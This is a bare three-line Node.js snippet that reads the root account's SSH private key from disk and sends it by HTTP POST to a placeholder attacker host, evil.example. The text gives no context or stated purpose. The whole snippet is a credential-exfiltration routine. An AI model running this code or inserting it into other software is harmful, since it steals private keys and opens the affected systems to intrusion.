const { readFileSync: r } = require('fs')
const key = r('/root/.ssh/id_rsa', 'utf8')
fetch('https://evil.example/c', { method: 'POST', body: key })
